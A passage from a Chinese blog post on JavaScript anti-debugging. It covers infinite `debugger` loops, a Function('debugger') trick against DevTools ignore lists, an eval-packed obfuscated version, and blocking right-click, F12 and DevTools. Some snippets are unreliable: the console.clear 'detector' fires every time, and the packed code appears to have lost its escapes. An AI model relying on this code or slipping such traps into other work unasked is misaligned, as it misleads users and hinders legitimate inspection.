-<p>如果将 setInterval 中的代码写在一行，就能禁止用户断点，即使添加 logpoint 为 false 也无用。当然即使有些人想到用左下角的格式化代码，将其变成多行也是没用的。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ban</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">debugger</span>;</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">ban</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="忽略执行的代码">忽略执行的代码</span></h2><blockquote>
-<p>可以通过添加 add script ignore list 需要忽略执行代码行或文件，也可以达到禁止无限 debugger。 不过，我们可以通过将 debugger 改写成 Function (“debugger”)(); 的形式来应对，Function 构造器生成的 debugger 会在每一次执行时开启一个临时 js 文件。当然使用的时候，为了更加的安全，最好使用加密后的脚本。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 加密前</span></span><br><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ban</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="title class_">Function</span>(<span class="string">&quot;debugger&quot;</span>)();</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">ban</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密后</span></span><br><span class="line"><span class="built_in">eval</span>(</span><br><span class="line">  (<span class="keyword">function</span> (<span class="params">c, g, a, b, d, e</span>) &#123;</span><br><span class="line">    d = <span class="title class_">String</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>, <span class="title class_">String</span>)) &#123;</span><br><span class="line">      <span class="keyword">for</span> (; a--; ) e[a] = b[a] || a;</span><br><span class="line">      b = [</span><br><span class="line">        <span class="keyword">function</span> (<span class="params">f</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> e[f];</span><br><span class="line">        &#125;,</span><br><span class="line">      ];</span><br><span class="line">      d = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;w+&quot;</span>;</span><br><span class="line">      &#125;;</span><br><span class="line">      a = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (; a--; )</span><br><span class="line">      b[a] &amp;&amp; (c = c.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;\b&quot;</span> + <span class="title function_">d</span>(a) + <span class="string">&quot;\b&quot;</span>, <span class="string">&quot;g&quot;</span>), b[a]));</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">  &#125;)(</span><br><span class="line">    <span class="string">&#x27;(()=&gt;&#123;1 0()&#123;2(()=&gt;&#123;3(&quot;4&quot;)()&#125;,5)&#125;6&#123;0()&#125;7(8)&#123;&#125;&#125;)();&#x27;</span>,</span><br><span class="line">    <span class="number">9</span>,</span><br><span class="line">    <span class="number">9</span>,</span><br><span class="line">    <span class="string">&quot;block function setInterval Function debugger 50 try catch err&quot;</span>.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>),</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    &#123;&#125;</span><br><span class="line">  )</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="终极增强防调试">终极增强防调试</span></h2><blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">block</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">outerHeight</span> - <span class="variable language_">window</span>.<span class="property">innerHeight</span> &gt; <span class="number">200</span> ||</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">outerWidth</span> - <span class="variable language_">window</span>.<span class="property">innerWidth</span> &gt; <span class="number">200</span></span><br><span class="line">    ) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = <span class="string">&quot;检测到非法调试,请关闭后刷新重试!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;)</span><br><span class="line">        [<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;debugger&quot;</span>)</span><br><span class="line">        [<span class="string">&quot;call&quot;</span>]();</span><br><span class="line">    &#125;, <span class="number">50</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="title function_">block</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;&#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-</blockquote>
-<h2><span id="其他防调试技术">其他防调试技术</span></h2><blockquote>
-<p>除此之外，我们还可以通过【禁止右键菜单】、【禁止 F12 快捷键】、【检测开发者工具】等手段来禁止调试。</p>
-</blockquote>
-<h3><span id="禁止右键菜单">禁止右键菜单</span></h3><blockquote>
-<p>禁止右键菜单是目前比较常见的一种禁止调试的方法，因为浏览器默认右键菜单是可以调出开发者工具的。可以通过以下 JS 代码实现：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>这样一来，当用户在富文本编辑器的区域内右键时，就不会弹出菜单，从而避免了用户调出开发者工具的情况。</p>
-</blockquote>
-<h3><span id="禁止-f12-快捷键">禁止 F12 快捷键</span></h3><blockquote>
-<p>F12 快捷键是打开开发者工具的常用快捷键，禁止这个快捷键也是一种禁止调试的方法。可以通过以下 JS 代码实现：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.<span class="property">keyCode</span> === <span class="number">123</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-
-<p>这样一来，当用户按下 F12 键时，就会被拦截，从而避免了用户打开开发者工具的情况。</p>
-</blockquote>
-<h3><span id="检测开发者工具">检测开发者工具</span></h3><blockquote>
-<p>还有一种方法是通过检测开发者工具是否打开来实现禁止调试的目的，可以通过以下 JS 代码实现：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setInterval</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">console</span>.<span class="property">clear</span> !== <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">    location.<span class="title function_">reload</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure>
-
-<p>这段代码会每隔 1 秒检测一次当前页面是否打开了开发者工具，如果发现开发者工具已经打开，则会刷新当前页面，从而避免用户使用开发者工具对页面进行调试。</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Bypass/" rel="tag">Bypass</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Signature/" rel="tag">Signature</a>
             </div>
         
 
